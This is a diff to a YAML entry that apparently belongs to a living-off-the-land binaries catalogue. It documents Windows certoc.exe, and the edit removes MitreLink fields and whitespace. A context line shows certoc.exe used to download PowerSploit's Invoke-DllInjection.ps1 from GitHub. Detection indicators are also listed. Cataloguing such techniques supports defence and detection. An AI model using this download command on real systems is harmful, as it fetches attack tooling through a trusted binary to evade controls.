@@ -10,7 +10,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows Server 2022
   - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
     Description: Downloads text formatted files
@@ -18,14 +17,13 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/techniques/T1105/
-    OperatingSystem: Windows Server 2022  
+    OperatingSystem: Windows Server 2022
 Full_Path:
   - Path: c:\windows\system32\certoc.exe
   - Path: c:\windows\syswow64\certoc.exe
-Code_Sample: 
+Code_Sample:
   - Code:
-Detection: 
+Detection:
   - IOC: Process creation with given parameter
   - IOC: Unsigned DLL load via certoc.exe
   - IOC: Network connection via certoc.exe
